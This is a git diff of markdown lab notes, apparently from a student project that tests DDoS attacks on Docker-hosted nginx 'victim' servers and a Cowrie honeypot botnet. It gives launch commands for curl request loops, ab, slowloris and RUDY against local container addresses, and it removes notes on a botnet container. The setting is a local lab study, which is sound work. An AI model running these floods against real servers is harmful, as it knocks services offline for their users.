@@ -1,16 +1,4 @@
-# Setting up a DDoS attack
-
-## TODO
-- [x] Set up a victim server with nginx on a different network
-- [x] Constraints on the victim server (Ended up creating different types of services)
-- [ ] Evaluation metrics for inaccessibility
-  - [ ] Scenario: I am another service in the custom network and I want to access the victim's endpoint. How would the victim respond when overloaded with requests?
-- [x] See if it is indeed valid to test that on a Docker network -> There are people that have done it, even on the same network, but I haven't looked thorougly.
-- [/] Setup tools for monitoring the traffic and also log it (Found the tools but did not set them up)
-- [ ] See botnet options
-- [ ] Review default configurations for Cowrie (potentially remove RSA options for simplicity)
-- [ ] Considerations on the hardware constraints of the botnet actors
-- [ ] Suggestions here...
+# Exploring DDoS attacks
 
 ## Reverse-proxy (reverse-proxy)
 
@@ -31,8 +19,11 @@ Create network `docker network create victim-network` before docker compose on t
 
 ## Tools to Perform a DDoS/Stress Test
 
+These are some general tools to perform DDoS, it was an initial exploration, even though we cannot use that in the case of our Cowrie
+botnet.
+
 ## Simple curl script
-Just a dummy script to imitate a DDoS.
+**Description:** Just a dummy script to imitate a DDoS.
 ```sh
 for i in {1..100}; do
     (
@@ -108,41 +99,19 @@ ab -l -n 1000000 -c 1000 -k http://0.0.0.0:5000/
 Install using Python pip:
 ```sh
 pip install slowloris
+# or
+git clone https://github.com/gkbrk/slowloris
 ```
 
 Command for launching the attack:
 ```sh
 slowloris 172.19.0.2 -p 5000 -s 500
+# or
+python3 slowloris.py localhost -p 5002 -s 100 -v
 ```
 - `172.19.0.2`: Target IP address.
 - `-p 5000`: Target port.
 - `-s 500`: Number of simultaneous connections.
-
-## Observations
-
-- I had to run multiple `hping3` or combinations of `hping3` with `ab` to make the `dynamic` version potentially slower, yet it was still available after a while.
-- Keep-alive connections seem to be more effective (makes sense).
-- Needs more experimentation.
-
-## Further on DDoS
-
-### Slowris
-
-I got it from the source repository 
-
-```sh
-git clone https://github.com/gkbrk/slowloris
-```
-
-And attacked the victims locally, from my machine. 
-
-For example, I had the static website running on localhost on port 5002 and did the attack:
-
-```sh
-cd slowloris
-python3 slowloris.py localhost -p 5002 -s 100 -v
-```
-
 - `-v`: Verbose output to see the logs.
 
 ### RUDY
@@ -171,12 +140,11 @@ done
 This port was used for me for our static victim which died. 
 
 I got these logs from the container 
-![alt text](image.png)
+![rudy_ddos](rudy_ddos.png)
 
-which prove that the nginx cannot handle the concurrent requests. 
+which proves that the nginx cannot handle the concurrent requests. 
 
-Improtant is that I could not run the commands for loads of concurrent requests with a large payload (e.g, 5GB) withouth my host running out of memory. But imagine running this scripts from different bots in our botnet. This will for sure bring down the server. 
-<<>>
+Improtant is that I could not run the commands for loads of concurrent requests with a large payload (e.g, 5GB) withouth my host running out of memory.
 
 ## NGINX Config 
 
@@ -187,7 +155,6 @@ also added aliasing for the names dynamic-victim and static-victim on the docker
 events {
     worker_connections 1024; 
 }
-
 
 http {
     server {
@@ -201,7 +168,7 @@ http {
             proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
             proxy_set_header X-Forwarded-Proto $scheme;
             proxy_buffering off;
-	    # Logs
+            # Logs
             access_log /var/log/nginx/dynamic_access.log;
             error_log /var/log/nginx/dynamic_error.log debug;
         }
@@ -215,71 +182,9 @@ http {
             proxy_set_header X-Forwarded-Proto $scheme;
             proxy_buffering off;
             # Logs
-	    access_log /var/log/nginx/static_access.log;
-	    error_log /var/log/nginx/static_error.log debug;
+            access_log /var/log/nginx/static_access.log;
+            error_log /var/log/nginx/static_error.log debug;
         }
     }
 }
-
 ```
-
-## Botnet container 
-
-Made a Dockerfile 
-
-```sh 
-FROM python:3.9-slim
-
-# Set the working directory inside the container
-WORKDIR /app
-
-# Copy all files from the current directory into the container
-COPY . /app
-
-# Install the required Python dependencies
-RUN pip install -r requirements.txt
-
-RUN apt-get update && apt-get install -y \
-    curl \
-    bash \
-    && apt-get clean
-
-# Make the attack script executable
-RUN chmod +x /app/run_attack.sh
-
-ENTRYPOINT ["/bin/bash"]
-```
-
-Build botnet container 
-
-```sh
-docker build -t botnet-container .
-```
-
-Run it and attach it to chn-network 
-
-```sh
-docker run -it --name botnet 
-  --network chn-network \
-  botnet-container
-```
-
-Then the botnet cli must be set up inside the container 
-
-```sh
-python setup.py install
-```
-
-Some issues with missing dependencies needs additionally 
-
-```sh
-pip install simple-term-menu
-```
-
-Install also vim so we can modify the script
-
-```sh
-apt-get update && apt-get install -y vim
-```
-
-I had a script that used the AYDY ddos method but this needs go to be installed. But since we are to attack the victims through the honeypots we would need to have go installed there which I tried to do using the script. After many attempts, trying forward the attack from cowrie to the victims I was not succesful but the hpdfeeds work and we have the attacks on cowrie at chn server. If I am not mistaken the reason why the remote execution does not work is because of the ssh keys that **Myrto** mentioned.
